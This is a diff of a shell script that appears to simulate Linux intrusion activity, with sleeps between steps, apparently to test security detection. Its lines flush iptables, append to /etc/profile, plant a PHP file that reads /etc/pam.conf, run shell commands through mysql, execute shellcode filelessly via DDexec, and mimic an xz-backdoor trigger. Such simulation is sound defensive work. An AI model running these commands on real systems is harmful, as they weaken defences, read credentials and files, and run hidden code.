@@ -7,7 +7,7 @@ echo "#I was here" | tee -a /etc/profile
 echo "Starting sleep" && sleep 11
 touch /etc/apt/sources.list.d/testfile
 echo "Starting sleep" && sleep 11
-cat /root/.ssh/authorized_keys
+touch /root/.ssh/authorized_keys && cat /root/.ssh/authorized_keys
 echo "Starting sleep" && sleep 11
 echo -e "<?php\nreadfile(\"/etc/pam.conf\");\nreadfile(\"/../../../etc/pam.conf\");\n?>" > /var/www/html/TMV1CS; mv /var/www/html/TMV1CS /var/www/html/TMV1CS.php; service apache2 start; curl http://127.0.0.1/TMV1CS.php
 echo "Starting sleep" && sleep 11
@@ -44,8 +44,6 @@ echo "Starting sleep" && sleep 11
 touch /etc/cron.daily/testfile
 echo "Starting sleep" && sleep 11
 touch /etc/ld.so.preload
-echo "Starting sleep" && sleep 11
-apt-get -yq install mysql-server; service mysql start; mysql -Bse "system cat /etc/passwd"
 echo "Starting sleep" && sleep 11
 ssh -o BatchMode=yes -o StrictHostKeyChecking=no root@rraannddoomm.tteesstt 'whoami'
 echo "Starting sleep" && sleep 11
@@ -109,12 +107,14 @@ python3 -c "import urllib.request; response = urllib.request.urlopen('http://www
 echo "Starting sleep" && sleep 11
 pipx install fee && pipx ensurepath && export PATH="$PATH:/root/.local/bin" && source ~/.bashrc && fee /usr/bin/ls > output.py && python3 output.py
 echo "Starting sleep" && sleep 11
-git clone https://github.com/arget13/DDexec.git && cd DDexec && base64 -w0 /bin/ls | bash ddexec.sh ls -lA && SEEKER=cmp bash ddexec.sh ls -l <<< $(base64 -w0 /bin/ls) && bash ddsc.sh -x <<< "68444541444889e74831f64889f0b401b03f0f054889c7b04d0f05b0220f05" & cd /proc/$!/fd
+iptables -F
 echo "Starting sleep" && sleep 11
 touch /root/.bash_history
 grep -E '^(ssh|scp|rsync) ' "/root/.bash_history" 2>/dev/null | sort | uniq
 echo "Starting sleep" && sleep 11
 echo 'I2luY2x1ZGUgPGlvc3RyZWFtPgojaW5jbHVkZSA8ZnN0cmVhbT4KdXNpbmcgbmFtZXNwYWNlIHN0ZDsKCmludCBtYWluKCkgewoJc3RyaW5nIHRlc3Q7CglpZnN0cmVhbSBSZWFkRmlsZSgibGlibHptYS5zby41LjYuMCIpOwoKCXdoaWxlIChnZXRsaW5lKFJlYWRGaWxlLCB0ZXN0KSkgewoJCWNvdXQgPDwgdGVzdDsKCX0KCglSZWFkRmlsZS5jbG9zZSgpOwoJcmV0dXJuIDA7Cn0K' | base64 -d > trigger.cpp; g++ trigger.cpp -o sshd; echo 'rraannddoomm' > liblzma.so.5.6.0; ./sshd; exit
 echo "Starting sleep" && sleep 11
-iptables -F
+apt-get -yq install mysql-server; service mysql start; mysql -Bse "system cat /etc/passwd"
+echo "Starting sleep" && sleep 11
+git clone https://github.com/arget13/DDexec.git && cd DDexec && base64 -w0 /bin/ls | bash ddexec.sh ls -lA && SEEKER=cmp bash ddexec.sh ls -l <<< $(base64 -w0 /bin/ls) && bash ddsc.sh -x <<< "68444541444889e74831f64889f0b401b03f0f054889c7b04d0f05b0220f05" & cd /proc/$!/fd
 echo "END"
